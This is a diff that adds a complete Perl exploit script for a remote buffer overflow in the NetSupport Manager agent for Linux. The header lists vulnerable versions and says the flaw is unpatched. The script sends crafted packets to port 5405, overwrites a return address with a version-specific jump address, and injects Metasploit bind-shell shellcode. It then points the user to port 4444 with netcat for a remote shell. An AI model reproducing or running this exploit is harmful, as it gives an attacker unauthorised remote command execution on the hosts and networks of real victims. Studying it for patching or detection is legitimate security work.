@@ -1,0 +1,102 @@
+#!/usr/bin/perl
+#
+# NetSupport Manager Agent Remote Buffer Overflow
+# Product details: http://www.netsupportmanager.com/
+#
+# This vulnerability affects the following software:
+#
+# [Vulnerable] 
+# NetSupport Manager for Linux v11.00 and likely all previous
+# NetSupport Manager for Solaris v9.50 and likely all previous
+# NetSupport Manager for Mac OS X v11.00 and likely all previous
+#
+# [Not Vulnerable]
+# Netsupport Manager for Windows v11.00
+#
+# [Unknown]
+# Netsupport Manager for Windows CE v11.00
+# Netsupport Manager for Pocket PC v11.00
+# NetSupport Manager for DOS v7.01
+# Other products based on the same codebase (e.g. NetSupport School)
+#
+# This exploit has been tested against:
+# - NetSupport Manager Linux agent v10.50.0
+# - NetSupport Manager Linux agent v11.0.0
+#
+# As far as I know, this is still unpatched. 
+#
+# Credit: Luca Carettoni (@_ikki) 
+
+use strict;
+use warnings;
+use IO::Socket;
+
+my $host = shift || die "Usage: $0 host [port]\n";
+my $port = shift || 5405;
+my $sock = new IO::Socket::INET(PeerAddr => $host, PeerPort => $port, PeerProto => 'tcp') or die "error: $!\n";
+
+print "--[ NetSupport Manager Linux Agent Remote Buffer Overflow ]\n";
+print "--[ \@_ikki 2010 ]\n\n";
+
+#my $ret_address = 0x0808bd4f; #jmp esp /usr/nsm/daemon/clientdaemon v10.50.0
+my $ret_address = 0x0808c4bf; #jmp esp /usr/nsm/daemon/clientdaemon v11.0.0
+my $pad = 976;
+my $nop = "\x90" x 50;
+
+# linux/x86/shell_bind_tcp - 217 bytes
+# http://www.metasploit.com
+# Encoder: x86/alpha_mixed
+# AutoRunScript=, AppendExit=false, PrependChrootBreak=false, 
+# PrependSetresuid=false, InitialAutoRunScript=, 
+# PrependSetuid=false, LPORT=4444, RHOST=, 
+# PrependSetreuid=false
+my $shellcode = 
+"\x89\xe0\xdb\xcb\xd9\x70\xf4\x59\x49\x49\x49\x49\x49\x49" .
+"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a" .
+"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41" .
+"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42" .
+"\x75\x4a\x49\x46\x51\x49\x4b\x4c\x37\x4a\x43\x51\x43\x43" .
+"\x73\x43\x63\x43\x5a\x44\x42\x4c\x49\x4b\x51\x48\x30\x51" .
+"\x76\x4a\x6d\x4d\x50\x43\x6b\x51\x4e\x50\x52\x43\x58\x49" .
+"\x6f\x47\x72\x47\x61\x51\x4c\x43\x5a\x42\x30\x42\x71\x46" .
+"\x30\x4c\x49\x48\x61\x51\x7a\x45\x36\x46\x38\x48\x4d\x4d" .
+"\x50\x4c\x49\x51\x51\x46\x64\x4d\x63\x46\x64\x4c\x70\x45" .
+"\x36\x4a\x6d\x4b\x30\x51\x53\x4c\x70\x51\x76\x4a\x6d\x4b" .
+"\x30\x4e\x73\x50\x59\x50\x6a\x47\x4f\x46\x38\x4a\x6d\x4b" .
+"\x30\x47\x39\x43\x49\x49\x68\x50\x68\x46\x4f\x46\x4f\x42" .
+"\x53\x45\x38\x51\x78\x46\x4f\x45\x32\x50\x69\x50\x6e\x4d" .
+"\x59\x49\x73\x50\x50\x42\x73\x4b\x39\x49\x71\x4c\x70\x44" .
+"\x4b\x48\x4d\x4d\x50\x41\x41";
+
+
+my $triggerA = "\x15\x00\x5a\x00".("\x41" x 1024)."\x00\x00\x00".
+	 	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+
+my $triggerB = "\x25\x00\x51\x00\x81\x41\x41\x41\x41\x41\x41\x00".
+		"\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+		"\x00\x00\x00";
+
+my $triggerC = "\x37\x00\x03\x00\x0a\x00\x00\x00\x00\x00\x58\xb4".
+		"\x92\xff\x00\x00\x69\x6b\x6b\x69\x00\x57\x4f\x52".
+		"\x4b\x47\x52\x4f\x55\x50\x00\x3c\x3e". #pleasure trail
+		("A"x$pad).pack("V", $ret_address).$nop.$shellcode.
+		"\x00\x00\x31\x32\x2e\x36\x32\x2e\x31\x2e\x34\x32".
+		"\x30\x00\x31\x30\x00\x00";
+
+my $triggerD = "\x06\x00\x07\x00\x20\x00\x00\x00\x0e\x00\x32\x00".
+		"\x01\x10\x18\x00\x00\x01\x9f\x0d\x00\x00\xe0\x07".
+		"\x06\x00\x07\x00\x00\x00\x00\x00\x02\x00\x4e\x00".
+		"\x02\x00\xac\x00\x04\x00\x7f\x00\x00\x00";
+
+print "Sending triggers...\n";
+$sock->send($triggerA);
+sleep 1;
+$sock->send($triggerB);
+sleep 1;
+$sock->send($triggerC);
+sleep 1;
+$sock->send($triggerD);
+sleep 1;
+$sock->close;
+print "A shell is waiting: \"nc ".$host." 4444\"\n\n";
